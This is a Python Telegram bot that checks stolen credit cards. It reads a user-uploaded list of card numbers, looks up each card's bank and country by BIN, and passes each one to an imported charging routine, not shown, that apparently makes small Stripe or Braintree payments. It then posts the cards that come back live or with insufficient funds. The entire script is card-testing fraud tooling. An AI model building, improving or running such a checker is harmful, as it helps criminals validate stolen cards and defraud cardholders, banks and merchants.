from mody import Mody
import requests
import telebot
from telebot import types
from ELHYBA import Tele 
token = Mody.ELHYBA
bot=telebot.TeleBot(token,parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,"Send the file now \n ارسل الملف الان")
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
			
				try:
					data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('-----------')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('-----------')
				try:
					cn=(data['country']['name'])
				except:
					cn=('-----------')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('-----------')
				try:
					typ=(data['type'])
				except:
					typ=('-----------')
				try:
					url=(data['bank']['url'])
				except:
					url=('----------')
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"• GooD ✅: [ {ch} ] •", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"• Live ✅ : [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• المجموع : [ {total} ] •", callback_data='x')
				mes.add(cm1, cm2, cm3, cm4, cm5)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''يتم الفحص بواسطه بوت 
BY  ➜ @elhyba ''', reply_markup=mes)
				
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "Your card was declined."
				
				msg = f'''◆ Card  ➜ {cc} 
◆ نظام ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ #squer
◆ stripper ➜ for 1$ 
━━━━━━━━━━━━━━━━━
◆ Bin ➜ {cc[:6]} - {dicr} - {typ} 
◆ المدينه ➜ {cn} - {emj} 
◆ البنك ➜ {bank}
◆ الرابط ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @elhyba
◆✅ '''
				print(last)
				if any(keyword in last for keyword in ["live", "success", "Your card has insufficient funds", "insufficient funds", "Payment success", "Thank you for your support."]): 
					bot.reply_to(message, msg)
					live += 1
				elif "Your card has insufficient funds." in last:
					live += 1
					bot.reply_to(message, msg)
				elif "success" in last:
					ch += 1
					msg1 = f'''◆ Card  ➜ {cc}
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ BRantree & strip  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑺𝑈𝑪𝑪𝐸𝑆𝑆
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ الاموال >>12$
━━━━━━━━━━━━━━━━━
◆ Bin ➜ {cc[:6]} - {dicr} - {typ} 
◆ المدينه ➜ {cn} - {emj} 
◆ البنك ➜ {bank}
◆ الرابط ➜ {url}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @elhyba
◆ ✅ '''
					bot.reply_to(message, msg1)
				else:
					dd += 1
	except:
		pass
print("تم تشغيل البوت")
bot.polling()
